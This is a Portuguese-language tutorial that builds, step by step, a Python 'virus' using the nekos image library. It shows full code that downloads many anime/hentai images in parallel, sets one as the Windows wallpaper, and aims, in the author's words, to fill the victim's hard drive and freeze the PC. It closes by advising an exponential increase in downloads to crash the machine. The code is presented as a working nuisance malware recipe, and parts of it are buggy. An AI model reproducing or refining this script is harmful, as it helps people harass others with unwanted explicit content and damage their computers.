Virus h paso a paso para python 
Capitulo 1 do virus entendendo como funciona a biblioteca(mas ou menos)

Meu virus de hentai passo a passo para baixa a biblioteca akaneko:
Primeiramente eu to fazendo esse tutorial inspírado num video do youtube irei coloca o link do canal do cara no final do documento, é um pouco semelhante com o dele o meu codigo

De alguma forma se Voce for trabalhar no pyhton nao da para baixa na maneira normal usando o comando:
npm akaneko (somente para quem for progamar em js)
A biblioteca akaneko tem varias outras imagens que voce que progama em java script pode utilizar, mas como estou acostumado em pyhton irei fazer em python
No python voce tem que fazer o seguinte comando:
pip install nekos.py  (isso ira baixa a biblioteca nekos para seu pc, no caso Voce baixara somente isso, fazer o que  se para quem programa em python só vai ter isso mas é suficiente para trava um pc rsrsrs)

Primeiramente vamos adicionar as blibiotecas que vamos usar:
import nekos
import requests
from concurrent.futures import ThreadPoolExecutor
import os
import crypes





Primeira parte do codigo:
import requests
import os

def checar_net():
    try:
        requests.get('https://www.google.com/')
        return True
    except requests.ConnectionError:
        return False
if checar_net():
    print("tem net")
else:
    print("não tem net")
Eu me inspirei um cara que vi no youtube que ele sempre checar primeiro se o pc esta conectado na internet

Segundo passo baixa uma imagem aleatoria da biblioteca:
import nekos
import requests

# URL da imagem aleatória de anime
url = nekos.img('neko')

# Baixa a imagem
response = requests.get(url)
with open('imagem1.jpg', 'wb') as f:
    f.write(response.content)

print("Imagem baixada com sucesso!")


Acaso voce queira ve os modulos disponiveis na biblioteca vou repassar o sequinte comando:
import nekos

# Lista todos os atributos do módulo nekos
print(dir(nekos))

você tem os seguintes atributos disponíveis na biblioteca nekos.py:

cat: Retorna uma imagem aleatória de um gato.
dict: Retorna uma imagem aleatória de um dicionário.
eightball: Retorna uma resposta aleatória de uma bola 8.
errors: Lista de exceções personalizadas.
fact: Retorna um fato aleatório.
http: Uma função para lidar com solicitações HTTP.
img: Retorna uma imagem aleatória.
name: Retorna um nome aleatório.
noresponse: Uma exceção para quando não há resposta.
owoify: Owoify seu texto.
spoiler: Owoify seu texto como spoiler.
textcat: Retorna um texto aleatório de um gato.
why: Retorna uma razão aleatória.
Com base nisso, parece que você pode usar img para obter imagens aleatórias. Vamos usá-lo para baixar e exibir uma imagem:
import nekos
import requests
import matplotlib.pyplot as plt

def mostrar_imagem(url):
    # Faz o download da imagem
    response = requests.get(url)
    # Converte a imagem em bytes para exibição
    imagem = plt.imread(response.content, format='jpg')
    # Exibe a imagem
    plt.imshow(imagem)
    plt.axis('off')  # Remove os eixos
    plt.show()

# URL da imagem aleatória
url = nekos.img('neko')

# Mostra a imagem
mostrar_imagem(url)

Este codigo baixara e exibira uma imagem aleatoria de um neko.  Mas é claro que voce não vai querer somente uma imagem ne? :)



Segundo capitulo do virus, baixando mas de uma imagem :)

Esse virus tem o objetivo de lotar o hd da pessoa de imagem então logo abaixo tem o codigo:
import nekos
import requests
from concurrent.futures import ThreadPoolExecutor

def download_image(url, path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(path, 'wb') as f:
            f.write(response.content)
        print(f"Imagem salva em {path}")
    else:
        print(f"Falha ao baixar a imagem de {url}. Status code: {response.status_code}")

def main():
    urls = [nekos.img('neko') for _ in range(10)]  # Gere 10 URLs de imagens
    paths = [f'imagem_{i}.jpg' for i in range(10)]  # Crie 10 nomes de arquivo

    with ThreadPoolExecutor(max_workers=10) as executor:
        for url, path in zip(urls, paths):
            executor.submit(download_image, url, path)

if __name__ == "__main__":
    main()
Essa parte é para que voce abaixe somente uma quantidade de imagem limitada, e sim nessa parte eu retirei aquilo de checar a internet mas irei coloca novamente, isso é apenas um exemplo de como voce conseque baixa mas de uma imagem


Logo abaixo eu mostrarei o codigo completo para baixa 100 imagens:
import nekos
import requests
from concurrent.futures import ThreadPoolExecutor
import os
import ctypes

#checar inicialmente se tem internet
def checar_net():
    try:
        requests.get('https://www.google.com/')
        return True
    except requests.ConnectionError:
        return False
if checar_net():
    print("tem net")
else:
    print("não tem net")

#função de baixa imagens da biblioteca
def download_image(url, path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(path, 'wb') as f:
            f.write(response.content)
        print(f"Imagem salva em {path}")
    else:
        print(f"Falha ao baixar a imagem de {url}. Status code: {response.status_code}")
        
  #definir a imagem depois do download como papel de parede       
def set_walpaper (image_path):
    if os.path.exists(image_path):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        print(f"papel de parede alterado para {image_path}")
    else:
        print(f"imagem não encontrada: {image_path}")
        
        
        

def main():
    num_images = 100
    urls = [nekos.img('neko') for _ in range(num_images)]  
    diretory = f'D:\\teste_virus\\'   

    with ThreadPoolExecutor(max_workers=10) as executor:
        for i, url in enumerate(urls):
            filename = f'imagem_{i}.jpg'
            path = os.path.join(diretory, filename)
            
            executor.submit(download_image, url, path)
            
    set_walpaper(os.path.join(diretory, 'imagem_1.jpg'))
    
    
    
    
    
if __name__ == "__main__":
    main()

Agora para travar um pc voce tem que aumenta o numero de imagem para baixa, recomendo que modifique e coloque ** exponencial para aumenta de forma significativa 
